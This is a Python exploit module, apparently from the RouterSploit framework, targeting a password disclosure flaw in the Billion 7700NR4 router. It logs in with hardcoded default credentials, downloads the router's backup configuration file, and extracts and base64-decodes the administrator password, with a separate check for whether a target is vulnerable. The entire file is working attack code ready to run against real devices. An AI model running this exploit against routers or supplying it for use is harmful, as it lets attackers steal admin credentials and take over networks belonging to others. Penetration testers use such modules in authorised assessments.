import re
import base64

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_status,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Billion 7700NR4 Password Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for admin user."
    """
    __info__ = {
        'name': 'Billion 7700NR4 Password Disclosure',
        'description': 'Exploits Billion 7700NR4 password disclosure vulnerability that allows to '
                       'fetch credentials for admin account',
        'authors': [
            'R-73eN',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40472/',
        ],
        'devices': [
            'Billion 7700NR4',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def_user = exploits.Option('user', 'Hardcoded username')
    def_pass = exploits.Option('user', 'Hardcoded password')

    def run(self):
        creds = []
        url = "{}:{}/backupsettings.conf".format(self.target, self.port)

        response = http_request(method="GET", url=url, auth=(self.def_user, self.def_pass))
        if response is None:
            print_error("Exploit failed")
            return

        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', response.text)

        if len(res):
            print_success("Found strings: {}".format(res[0]))

            try:
                print_status("Trying to base64 decode")
                password = base64.b64decode(res[0])
            except:
                print_error("Exploit failed - could not decode password")
                return

            creds.append(("admin", password))

            print_success("Credentials found!")
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        url = "{}:{}/backupsettings.conf".format(self.target, self.port)

        response = http_request(method="GET", url=url, auth=(self.def_user, self.def_pass))
        if response is None:
            return False  # target is not vulnerable

        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', response.text)

        if len(res):
            return True  # target is vulnerable

        return False  # target not vulnerable
